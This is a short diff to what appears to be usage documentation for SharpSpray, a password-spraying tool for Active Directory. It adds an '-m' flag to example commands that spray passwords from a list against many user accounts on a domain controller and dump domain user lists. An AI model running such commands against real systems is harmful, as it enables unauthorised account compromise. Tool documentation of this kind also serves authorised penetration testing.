@@ -66,8 +66,8 @@ SharpSpray.exe -x -z -u users.txt --pl psswd.txt
 SharpSpray.exe -x -z -u users.txt -p Passw0rd!
 SharpSpray.exe -x -z -s 3 -j 1 -u users.txt -k psswd.txt -o sprayed.txt
 
-SharpSpray.exe -w 32 -d DC-1.local --dc-ip 10.10.20.20 -u users.txt --pl psswd.txt
-SharpSpray.exe -w 32 -s 3 -j 1 -d DC-1.local --dc-ip 10.10.20.20 -u users.txt --pl psswd.txt
+SharpSpray.exe -w 32 -m -d DC-1.local --dc-ip 10.10.20.20 -u users.txt --pl psswd.txt
+SharpSpray.exe -w 32 -s 3 -j 1 -m -d DC-1.local --dc-ip 10.10.20.20 -u users.txt --pl psswd.txt
 
 SharpSpray.exe --get-users-list
 SharpSpray.exe --get-users-list > users.txt
